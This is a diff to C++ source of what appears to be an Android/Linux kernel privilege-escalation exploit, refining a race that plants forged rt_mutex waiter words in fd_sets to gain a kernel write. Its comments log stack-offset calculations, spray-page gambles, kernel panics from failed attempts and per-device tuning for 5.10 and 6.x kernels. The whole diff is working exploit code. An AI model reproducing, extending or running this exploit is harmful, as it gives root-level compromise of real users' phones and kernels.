@@ -1,5 +1,9 @@
 #include "route/select_stack_route.h"
-
+#include <sys/resource.h>
+#include <sys/select.h>
+#include <sys/syscall.h>
+#include <ctime>
+#include <time.h>
 #include <unistd.h>
 
 #include <utility>
@@ -306,7 +310,19 @@ namespace ghostlock::route {
         if (compact) {
             /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
          * the write value, children the write target; waiter->task is the
-         * payload fake_task (planted fields for the PI walk). */
+         * payload fake_task (planted fields for the PI walk).
+         *
+         * v13 (compact=2 / 5.10 legacy only, reference mt6896 design): the
+         * chain only needs the [7] erase — after the write it must STOP, not
+         * walk planted structures on the (gambled) spray page. So:
+         *   task = init_task alias  → wake_up_process in the [9] no-owner exit
+         *     wakes the idle task (reference-proven no-op) instead of ttwu on a
+         *     fake task_struct;
+         *   lock = zero-zone slot   → zeroed rt_mutex: [7] requeue inserts the
+         *     stamped waiter as a black root on the NULL tree (no descent), [9]
+         *     owner==NULL exits. The v12.12 pstore panic (rb_insert_color+0x48,
+         *     NULL gparent read) was this descent on a spray page whose plant
+         *     lost the page-recycling gamble. */
             struct pselect_waiter_word words[] = {
                 {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
                 {3, 0, "tree_right"},
@@ -314,14 +330,25 @@ namespace ghostlock::route {
                 {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
                 {6, 0, "pi_right"},
                 {7, request->target, "pi_left"},
-                {8, (session::g_exploit_session.heap.current.fake_task), "task"},
-                {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
+                {8, compact == 2 ? ghostlock::profile::slide_init_task()
+                                 : (session::g_exploit_session.heap.current.fake_task),
+                 "task"},
+                {9, compact == 2 ? support::next_zero_lock_slot()
+                                 : (session::g_exploit_session.heap.current.fake_lock),
+                 "lock"},
+                {10, compact == 2 ? static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO)
+                                  : ((static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3),
+                 "wake_prio"}, /* 5.10 legacy: prio low half, no wake_state (padding high) */
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
             for (size_t i = 0; i < std::size(words); i++) {
                 struct pselect_waiter_word *w = &words[i];
+                if (compact == 2 && w->word == 12) {
+                    /* 5.10 waiter ends at +0x50 (no ww_ctx field); writing
+                     * past the struct is unproven territory — skip it. */
+                    continue;
+                }
                 pselect_put_waiter_word(context, words_per_set,
                                         w->word, w->value, w->name);
             }
@@ -419,7 +446,18 @@ namespace ghostlock::route::select_stack {
      * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
      * The consumer handshake advances consumer_go per attempt so the trigger
      * is seen as a new sequence. */
-        const int32_t attempts = layout.compact_waiter.value_or(0) ? 4 : 1;
+        /* v11.9 (codex review): the in-route retry re-enters
+         * prepare_good_kernel_page() and re-signals the consumer while the
+         * attempt-1 PI waiter is still alive. On 5.10 the
+         * FUTEX_CMP_REQUEUE_PI EDEADLK rollback leaves the WAITER task's
+         * pi_blocked_on dangling (remove_waiter() clears current — the
+         * requeue caller — not waiter->task), so attempt 2+'s
+         * sched_setattr(waiter_tid) walks the ghost and panics in
+         * rt_mutex_adjust_prio_chain+0x188 (panics #6/#7/#8, 2026-10-03).
+         * Only 6.x compact may retry in-route; 5.x gets exactly one attempt
+         * per fully-disarmed race, like the CLI flow. */
+        const int32_t attempts =
+                (profile.kernel_major() >= 6 && layout.compact_waiter.value_or(0)) ? 4 : 1;
         int32_t calls_total = 0;
         int32_t successes_total = 0;
 
@@ -445,36 +483,151 @@ namespace ghostlock::route::select_stack {
             race->consumer_stop.store(0);
             uint32_t delay_usec = route::route_delay_usec(this, attempt);
             race->route_delay_usec.store(delay_usec);
-            race->consumer_go.store(attempt);
+            /* v12.12: consumer_go 原先在这里、在 diag 探针之前置位——diag 用
+             * libc select()(72) 驻留 timeout_us，与 consumer 轮询的载体号相同，
+             * fd_set 却是 NULL（陈旧 ghost 未盖章）→ 轮询会命中并往未盖章
+             * 窗口里点火。现在挪到 diag 之后、真载体进栈之前。 */
 
             pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                     attempt, attempts, layout.compact_waiter.value_or(0),
                     route::fops_elapsed_ms(&route_t0));
             errno = 0;
-            if (layout.compact_waiter.value_or(0)) {
+            {
                 uint32_t timeout_us = profile.select_timeout_us();
-                struct timespec ts = {
-                    .tv_sec = timeout_us / 1000000,
-                    .tv_nsec = (long) (timeout_us % 1000000) * 1000,
-                };
-                select_result = pselect(
-                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
-                    exception_set.raw(), &ts, nullptr);
-            } else {
-                uint32_t timeout_us = profile.select_timeout_us();
+                /* v8-diag: parameter-level truth (handover §3.6-a): in-process
+                 * probe select(320,NULL,NULL,NULL,{0,50ms}) splits "environment
+                 * rejects" from "real args rejected"; logs RLIMIT_NOFILE / tv /
+                 * the three set addresses and the first stamped words. */
+                {
+                    struct rlimit nofile_rl {};
+                    getrlimit(RLIMIT_NOFILE, &nofile_rl);
+                    /* v12.12: 探针驻留固定 2ms——它的职责只是验证 nfds/环境
+                     * （v8/v10-diag 已取完数据）。跟随 timeout_us 会让它以
+                     * select(72) 的身份长时间驻留，污染 /proc syscall 号
+                     * 语义（现在 consumer_go 已挪到探针后，双保险）。 */
+                    constexpr uint32_t diag_tv_us = 2000;
+                    struct timeval diag_tv = {
+                        .tv_sec = static_cast<time_t>(diag_tv_us / 1000000),
+                        .tv_usec = static_cast<long>(diag_tv_us % 1000000),
+                    };
+                    const int diag_probe_errno_bak = errno;
+                    /* v8: split enter/back so a logd stall (enter missing) is
+                     * distinguishable from the probe select never returning
+                     * (back missing) — both look identical in the 300s silence
+                     * the v8diag runs produced. */
+                    pr_info("select diag enter: nfds=%d tv_us=%u(real timeout) probe_us=2000 sets=(in=%p out=%p ex=%p)\n",
+                            PSELECT_ROUTE_NFDS, timeout_us,
+                            static_cast<const void *>(input_set.raw()),
+                            static_cast<const void *>(output_set.raw()),
+                            static_cast<const void *>(exception_set.raw()));
+                    /* v10-diag: full 15-word stamped baseline (in 5 + out 5
+                     * + ex 5). Words must survive verbatim until the kernel
+                     * write lands mid-select; the back-words dump below
+                     * diffs against this. */
+                    pr_info("select diag enter-words: "
+                            "in=%016llx %016llx %016llx %016llx %016llx "
+                            "out=%016llx %016llx %016llx %016llx %016llx "
+                            "ex=%016llx %016llx %016llx %016llx %016llx\n",
+                            static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 0)),
+                            static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 1)),
+                            static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 2)),
+                            static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 3)),
+                            static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 4)),
+                            static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 0)),
+                            static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 1)),
+                            static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 2)),
+                            static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 3)),
+                            static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 4)),
+                            static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 0)),
+                            static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 1)),
+                            static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 2)),
+                            static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 3)),
+                            static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 4)));
+                    const int diag_probe =
+                        select(320, nullptr, nullptr, nullptr, &diag_tv);
+                    pr_info("select diag back: nofile_cur=%lu nofile_max=%lu "
+                            "tv=(%ld,%ld) probe320={ret=%d errno=%d}\n",
+                            static_cast<unsigned long>(nofile_rl.rlim_cur),
+                            static_cast<unsigned long>(nofile_rl.rlim_max),
+                            static_cast<long>(diag_tv.tv_sec),
+                            static_cast<long>(diag_tv.tv_usec),
+                            diag_probe, (diag_probe < 0) ? errno : 0);
+                    errno = diag_probe_errno_bak;
+                }
+                /* v12.12: consumer 现在才放行——此后 waiter 进真载体
+                 * (pselect6=73) 驻留，/proc syscall 号即所轮询的号，
+                 * fd_set 已盖章，轮询命中即安全点火。 */
+                /* v12.11 ★ Sony shift 定案：5.10 legacy 必须走 pselect6
+                 * 系统调用（73 / __arm64_sys_pselect6），不能用 libc select()。
+                 * ——libc select() 在本机确为 72（__arm64_sys_select）：反汇编
+                 *   /system/lib64/libc.so 得 select@@LIBC -> 桩 `mov x8,#0x48;
+                 *   svc`，pselect@@LIBC -> `mov x8,#0x49`（0x49=73）✓
+                 * 栈几何（相对该线程内核栈顶 TOP；入口开销 = S_FRAME_SIZE 0x150
+                 * + el0_sync_handler 0x10 + el0_svc 0x10 + el0_svc_common 0x50
+                 * = 0x1C0，已用 consumer 的 panic SP 落到整 16KB 栈顶交叉验证）：
+                 *   select()   fd_set 三元组 = TOP-0x1C0-0x80 -0x1c0+0x50 = TOP-0x3B0
+                 *   pselect6() fd_set 三元组 = TOP-0x1C0-0xa0 -0x1c0+0x50 = TOP-0x3D0
+                 *   陈旧 rt_mutex_waiter       = TOP-0x3D0
+                 *   （4 次独立 +0x188 panic 的 x28 低 16 位恒为 0xbc30）
+                 * ⇒ 只有 pselect6 让 global word 0 正好压在 ghost 基址上；
+                 *   select() 高 4 个字，任何 shift/nfds 都够不到（这也是过去
+                 *   mcast/select 全部 miss 的唯一根因）。
+                 * waiter_shift=-2 把 App 词表下标（compact+2）折回 global word，
+                 * 于是 ghost 基址 = global word 0。 */
+                int32_t compact = layout.compact_waiter.value_or(0);
                 struct timeval timeout = {
                     .tv_sec = timeout_us / 1000000,
                     .tv_usec = timeout_us % 1000000,
                 };
-                select_result = select(
-                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
-                    exception_set.raw(), &timeout);
+                race->consumer_go.store(attempt);
+                if (compact == 2) {
+                    struct timespec psel_ts = {
+                        .tv_sec = static_cast<time_t>(timeout_us / 1000000),
+                        .tv_nsec = static_cast<long>(timeout_us % 1000000) * 1000,
+                    };
+                    pr_info("pselect6 carrier: nfds=%d shift=%d ts=(%lld,%ld)\n",
+                            PSELECT_ROUTE_NFDS,
+                            route::pselect_waiter_shift(this),
+                            static_cast<long long>(psel_ts.tv_sec), psel_ts.tv_nsec);
+                    select_result = static_cast<int32_t>(syscall(
+                        SYS_pselect6, PSELECT_ROUTE_NFDS, input_set.raw(),
+                        output_set.raw(), exception_set.raw(), &psel_ts, nullptr));
+                } else {
+                    select_result = select(
+                        PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
+                        exception_set.raw(), &timeout);
+                }
             }
             select_errno = errno;
+            /* v10-diag: post-select 15-word dump. select() returning 0
+             * zeroes out/ex on the kernel side before the copy-back, so
+             * enter-vs-back word diffs name exactly which stamped words
+             * the kernel rewrote (copy-back erase window) and which
+             * survived untouched. Pair with the enter dump above. */
+            pr_info("select diag back-words: "
+                    "in=%016llx %016llx %016llx %016llx %016llx "
+                    "out=%016llx %016llx %016llx %016llx %016llx "
+                    "ex=%016llx %016llx %016llx %016llx %016llx\n",
+                    static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 0)),
+                    static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 1)),
+                    static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 2)),
+                    static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 3)),
+                    static_cast<unsigned long long>(route::fdset_get_word(input_set.raw(), 4)),
+                    static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 0)),
+                    static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 1)),
+                    static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 2)),
+                    static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 3)),
+                    static_cast<unsigned long long>(route::fdset_get_word(output_set.raw(), 4)),
+                    static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 0)),
+                    static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 1)),
+                    static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 2)),
+                    static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 3)),
+                    static_cast<unsigned long long>(route::fdset_get_word(exception_set.raw(), 4)));
             route::restore_standard_io(stdio_backup);
-            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
+            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d errno=%d (%s)\n",
                     attempt, attempts, layout.compact_waiter.value_or(0),
-                    route::fops_elapsed_ms(&route_t0), select_result);
+                    route::fops_elapsed_ms(&route_t0), select_result,
+                    select_errno, strerror(select_errno));
             race->consumer_go.store(0);
 
             const int32_t calls = race->consumer_calls.load();
@@ -509,7 +662,10 @@ namespace ghostlock::route {
         const route::RouteStatus status = run_route_lifecycle(context);
         if (context.status.code == ROUTE_DIRTY_FAILURE &&
             context.status.step == 34) {
-            pr_error("pselect consumer still inflight; leaking route fds\n");
+            /* v11.2: non-fatal (was pr_error => exit(-1)); the lifecycle
+             * already returned a dirty status and the caller tears the
+             * attempt down. */
+            pr_step("pselect consumer still inflight; leaking route fds\n");
         }
 
         pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
